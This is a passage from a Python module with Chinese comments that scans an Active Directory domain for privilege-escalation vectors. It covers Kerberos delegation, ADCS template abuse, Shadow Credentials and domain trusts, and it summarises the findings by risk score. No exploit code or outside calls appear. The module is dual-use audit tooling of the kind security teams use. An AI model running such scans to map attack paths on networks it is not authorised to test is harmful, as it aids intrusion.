                            target_domain=current_name,
                            trust_direction=current_direction,
                            has_high_privilege=False,
                            admin_logged_in=False,
                            attack_path=(
                                f"信任域攻击: 从{self._current_domain}到{current_name}"
                            ),
                            risk_score=50.0,
                        ))

                        current_name = ""
                        current_type = ""
                        current_direction = ""

        except Exception as e:
            logger.debug(f"Linux域信任关系检测失败: {e}")

        return results

    def _parse_trust_type(self, trust_type: str) -> TrustType:
        """解析信任类型

        Args:
            trust_type: 信任类型字符串

        Returns:
            信任类型枚举
        """
        type_lower = trust_type.lower()
        if "parent" in type_lower:
            return TrustType.PARENT_CHILD
        if "forest" in type_lower:
            return TrustType.FOREST
        if "external" in type_lower:
            return TrustType.EXTERNAL
        return TrustType.CROSS_FOREST


# =============================================================================
# 主域提权检测器
# =============================================================================

class DomainPrivescDetector:
    """域特权提升检测器

    整合Kerberos委派、ADCS滥用、Shadow Credentials、域信任关系检测。

    Attributes:
        _delegation_detector: Kerberos委派检测器
        _adcs_detector: ADCS检测器
        _shadow_detector: Shadow Credentials检测器
        _trust_detector: 域信任关系检测器
    """

    def __init__(self) -> None:
        """初始化域提权检测器"""
        self._delegation_detector = KerberosDelegationDetector()
        self._adcs_detector = ADCSDetector()
        self._shadow_detector = ShadowCredentialsDetector()
        self._trust_detector = DomainTrustDetector()

    async def full_scan(self) -> Dict[str, Any]:
        """完整扫描域提权向量

        Returns:
            扫描结果
        """
        delegations = await self._delegation_detector.detect()
        adcs_vulns = await self._adcs_detector.detect()
        shadow_creds = await self._shadow_detector.detect()
        trusts = await self._trust_detector.detect()

        return {
            "delegations": [d.to_dict() for d in delegations],
            "adcs_vulnerabilities": [v.to_dict() for v in adcs_vulns],
            "shadow_credentials": [s.to_dict() for s in shadow_creds],
            "trust_relationships": [t.to_dict() for t in trusts],
            "summary": self._generate_summary(
                delegations, adcs_vulns, shadow_creds, trusts,
            ),
            "scanned_at": datetime.now().isoformat(),
        }

    def _generate_summary(
        self,
        delegations: List[DelegationInfo],
        adcs_vulns: List[ADCSVulnerability],
        shadow_creds: List[ShadowCredentialInfo],
        trusts: List[TrustRelationship],
    ) -> Dict[str, Any]:
        """生成扫描摘要

        Args:
            delegations: 委派信息
            adcs_vulns: ADCS漏洞
            shadow_creds: Shadow Credentials
            trusts: 信任关系

        Returns:
            扫描摘要
        """
        critical_findings = []
        high_findings = []

        for d in delegations:
            if d.risk_score >= 80:
                critical_findings.append(
                    f"Kerberos委派滥用: {d.target_computer} "
                    f"({d.delegation_type.value})",
                )
            else:
                high_findings.append(
                    f"Kerberos委派: {d.target_computer}",
                )

        for v in adcs_vulns:
            if v.risk_score >= 85:
                critical_findings.append(
                    f"ADCS漏洞: {v.esc_type.value} - {v.template_name}",
                )
            else:
                high_findings.append(
                    f"ADCS风险: {v.esc_type.value} - {v.template_name}",
                )

        for s in shadow_creds:
            if s.can_add_key_credential:
                critical_findings.append(
                    f"Shadow Credentials: {s.target_object}",
                )

        for t in trusts:
            if t.has_high_privilege or t.admin_logged_in:
                critical_findings.append(
                    f"域信任关系: {t.source_domain} -> {t.target_domain}",
                )

        return {
            "total_delegations": len(delegations),
            "total_adcs_vulns": len(adcs_vulns),
            "total_shadow_creds": len(shadow_creds),
            "total_trusts": len(trusts),
            "critical_findings": critical_findings,
            "high_findings": high_findings,
            "total_critical": len(critical_findings),
            "total_high": len(high_findings),
        }


# =============================================================================
# 全局单例
# =============================================================================

_domain_privesc_detector: Optional[DomainPrivescDetector] = None


def get_domain_privesc_detector() -> DomainPrivescDetector:
    """获取域提权检测器全局单例

    Returns:
        DomainPrivescDetector 实例
    """
    global _domain_privesc_detector
    if _domain_privesc_detector is None:
        _domain_privesc_detector = DomainPrivescDetector()
    return _domain_privesc_detector


__all__ = [
    "DomainPrivescDetector",
    "KerberosDelegationDetector",
    "ADCSDetector",
    "ShadowCredentialsDetector",
    "DomainTrustDetector",
    "DelegationInfo",
    "ADCSVulnerability",
    "ShadowCredentialInfo",
    "TrustRelationship",
    "DelegationType",
    "ADCSEscType",
    "TrustType",
    "ADCS_ESC_TEMPLATES",
    "get_domain_privesc_detector",
]
